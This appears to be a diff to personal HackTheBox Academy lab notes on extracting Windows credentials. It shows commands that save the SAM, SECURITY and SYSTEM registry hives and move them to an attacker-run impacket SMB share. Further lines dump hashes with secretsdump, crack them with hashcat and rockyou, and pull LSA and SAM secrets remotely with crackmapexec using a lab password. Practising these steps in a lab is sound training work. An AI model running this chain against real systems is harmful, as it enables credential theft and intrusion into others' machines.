@@ -247,9 +247,9 @@ C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
 
 The operation completed successfully`
 
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/htb-ac-1594028 
 
-`sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
-C:\> move sam.save \\10.10.15.16\CompData
+C:\> move sam.save \\10.10.14.83\CompData
         1 file(s) moved.
 
 C:\> move security.save \\10.10.15.16\CompData
@@ -258,3 +258,7 @@ C:\> move security.save \\10.10.15.16\CompData
 C:\> move system.save \\10.10.15.16\CompData
         1 file(s) moved.`
 
+python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+sudo hashcat -m 1000 pass.txt /usr/share/wordlists/rockyou.txt
+crackmapexec smb 10.129.195.118 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
+crackmapexec smb 10.129.195.118 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
